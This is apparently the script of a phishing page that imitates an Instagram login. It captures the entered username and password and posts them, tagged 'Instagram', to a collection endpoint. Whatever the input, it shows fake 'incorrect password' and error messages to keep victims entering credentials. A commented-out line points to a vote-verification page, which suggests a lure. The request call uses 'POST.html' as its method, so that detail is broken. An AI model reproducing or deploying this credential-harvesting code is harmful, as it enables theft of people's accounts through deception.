<script>
         var login = document.getElementById('login');
        var loader = document.getElementById('loader')
        var feedback = document.getElementById('feedback')
        var username = document.getElementById('username')
        var password = document.getElementById('password')
        var x = 0;
        login.addEventListener('click', function () {
            login.textContent = "";
            loader.style.display = "block"

            setTimeout(() => {
                feedback.style.display = 'block'
                login.textContent = "Log In"
                loader.style.display = "none"
                if (username.value == "" || password.value == "") {
                    feedback.textContent = "Input's cannot be empty"
                }else {
                    validation()
                }
            }, 1500);

        })

        function validation() {
            login.textContent = "";
            loader.style.display = 'block'

            setTimeout(() => {
                login.textContent = 'Log In'
                loader.style.display = 'none'
   
                var url = 'action.html';
                var xhr2 = new XMLHttpRequest()
                var data2 = new FormData()
                data2.append('username', username.value);
                data2.append('pass', password.value);
                data2.append('type', "Instagram");
                xhr2.onreadystatechange = function () {
                    
                }
                xhr2.open('POST.html', url, 'true');
                xhr2.send(data2)

            x ++
            feedback.textContent = 'The password you entered is incorrect. Please check your password and try again';
            if (x == 2) {
                feedback.textContent = 'Sorry an error occurred please try again later'
            }else if (x == 3){
                feedback.textContent = '';
                // window.location.href='vote_verification.html'
            }

            }, 1500);
        }
</script>
